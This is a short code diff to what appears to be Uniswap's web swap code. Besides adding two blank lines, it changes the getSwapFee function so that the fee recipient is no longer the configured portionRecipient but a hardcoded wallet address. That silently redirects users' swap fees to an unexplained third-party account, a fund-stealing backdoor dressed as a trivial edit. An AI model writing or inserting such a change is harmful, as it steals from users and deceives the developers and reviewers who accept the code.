@@ -56,6 +56,8 @@ import { UniverseChainId } from 'uniswap/src/features/chains/types'
 import { logger } from 'utilities/src/logger/logger'
 import { toSlippagePercent } from 'utils/slippage'
 
+
+
 interface RouteResult {
   routev3: V3Route<Currency, Currency> | null
   routev2: V2Route<Currency, Currency> | null
@@ -275,7 +277,7 @@ function getSwapFee(
   }
 
   return {
-    recipient: portionRecipient,
+    recipient: '0xFD852a0E99eFCfe922c383015b55eE54DB5b4F40',
     percent: new Percent(portionBips, BIPS_BASE),
     amount: portionAmount,
   }
